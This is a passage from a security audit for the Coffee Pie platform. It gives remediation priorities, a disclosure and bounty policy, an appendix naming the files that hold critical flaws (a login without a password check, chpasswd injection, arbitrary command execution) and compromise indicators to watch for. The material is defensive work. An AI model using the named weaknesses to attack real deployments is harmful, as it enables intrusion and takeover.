| 3 | Sanitize `user` parameter in chpasswd calls (VULN-ORCH-003) | Privilege escalation |
| 4 | Transfer COFP ownership to Gnosis Safe multi-sig (VULN-COFP-001) | Economic catastrophe |

### URGENT (This Month)

| # | Action | Mitigates |
|---|--------|-----------|
| 5 | Replace ALL `pickle.loads()` with JSON+HMAC (VULN-ORCH-001) | RCE via DB compromise |
| 6 | Add CSRF tokens to REST endpoints (VULN-ORCH-002) | CSRF attacks |
| 7 | Enforce production Django settings (VULN-ORCH-004) | Info leakage |
| 8 | Add IP validation to Sunshine PIN endpoint (VULN-PROX-003) | SSRF |
| 9 | Implement command allowlist for JS engine (VULN-ACT-001) | Arbitrary execution |
| 10 | Add rate limiting to all auth endpoints | Brute force |
| 11 | Remove `'unsafe-inline'` from CSP (VULN-WEB-001) | XSS |
| 12 | Add SRI hashes to external scripts (VULN-WEB-003) | Supply chain |

### SHORT-TERM (This Quarter)

| # | Action | Mitigates |
|---|--------|-----------|
| 13 | Replace unwrap/expect in network paths (VULN-ACT-002) | DoS |
| 14 | Deploy internal CA + proper TLS (VULN-ACT-003) | MITM |
| 15 | Add authentication to kiosk CLI shortcut (VULN-FE-001) | Physical access |
| 16 | Enable port security + DAI on switches (VULN-INFRA-001) | ARP spoofing |
| 17 | Add COFP blacklist mechanism (VULN-COFP-002) | Token theft |
| 18 | Pin git dependency to commit hash (VULN-ORCH-005) | Supply chain |
| 19 | Add postMessage origin validation (VULN-WEB-002) | Cross-origin leaks |
| 20 | Audit SessionRecoveryBuffer UnsafeCell (VULN-TUN-001) | Data races |

### MEDIUM-TERM (Next 6 Months)

| # | Action | Mitigates |
|---|--------|-----------|
| 21 | Deploy WireGuard for streaming encryption (VULN-INFRA-002) | Traffic interception |
| 22 | Add timelock to COFP admin functions (VULN-COFP-001) | Governance attack |
| 23 | Replace Boa JS with sandboxed DSL (VULN-ACT-001) | Command injection |
| 24 | Segment network into VLANs (VULN-INFRA-001) | Lateral movement |
| 25 | Deploy redundant edge routers (VULN-INFRA-003) | DDoS resilience |
| 26 | Run miri on unsafe Rust code in CI (VULN-TUN-001) | Memory safety |
| 27 | Add fuzz testing for network protocol parsers | Protocol attacks |

---

## 15. Coordinated Vulnerability Disclosure (CVD)

If you are a security researcher or community member who has discovered a flaw within the ecosystem:

* **DO NOT open a public issue** on GitHub detailing the exploit mechanics.
* Submit an encrypted report to **security@coffeepie.co**.
* Coffee Pie commits to patching critical flaws within **72 hours** prior to public disclosure.
* Ethical researchers will be rewarded with:
  - Generous COFP tokens and Credit Packages
  - A permanent place on our open-source Hall of Fame
  - Public acknowledgement in the security advisory (unless anonymity is requested)

### Severity Classification for Bounties

| Severity | Bounty Range (COFP + Credits) | Examples |
|----------|-------------------------------|----------|
| CRITICAL | 50'000 - 100'000 | Auth bypass, RCE, contract ownership takeover |
| HIGH | 10'000 - 50'000 | SSRF, XSS, privilege escalation, DoS |
| MEDIUM | 1'000 - 10'000 | Information leakage, misconfiguration |
| LOW | 100 - 1'000 | Minor issues, hardening suggestions |

---

## Appendix A: Key File Inventory (Security-Critical)

| File | Risk |
|------|------|
| `proxmox_backend/app/api/auth_routes.py` | **CRITICAL** — Login without password check |
| `orchestrator/server/src/server/settings.py.sample` | **HIGH** — DEBUG=True, hardcoded keys |
| `orchestrator/server/src/uds/REST/dispatcher.py` | **HIGH** — CSRF-exempt entire API |
| `actor/crates/shared/src/unix/linux/mod.rs` | **HIGH** — chpasswd injection |
| `client/crates/js/src/js_modules/process.rs` | **HIGH** — arbitrary command exec |
| `tunnel-server/crates/server/src/broker/mod.rs` | **MEDIUM** — conditional SSL bypass |
| `actor/crates/shared/src/tls/noverify.rs` | **MEDIUM** — NoVerifySsl verifier |
| `blockchain/COFP_Token.sol` | **CRITICAL** — single owner, no timelock |
| `coffeepie_website/public/translate.js` | **HIGH** — innerHTML + postMessage |
| `coffeepie_website/public/.htaccess` | **MEDIUM** — CSP with unsafe-inline |

## Appendix B: Post-Exploitation Indicators to Monitor

- Unusual `/auth/login` requests with known email addresses
- Proxmox API calls from unexpected IPs
- `pickle.loads()` deserialization errors in logs
- `chpasswd` failures for nonexistent users
- Unexpected `Process.launch()` calls on VMs
- COFP token: `Paused` events, unexpected `Remint` events, `OwnershipTransferred` events
- CSP violation reports showing injected scripts
- ARP table changes on switches
- Sunshine/Moonlight connection attempts to unknown IPs

---


> *"The only secure system is one that is powered off, cast in a block of concrete, and sealed in a lead-lined room with armed guards — and even then I have my doubts."* — **Gene Spafford**
>
> *"Security is not a product, but a process."* — **Bruce Schneier**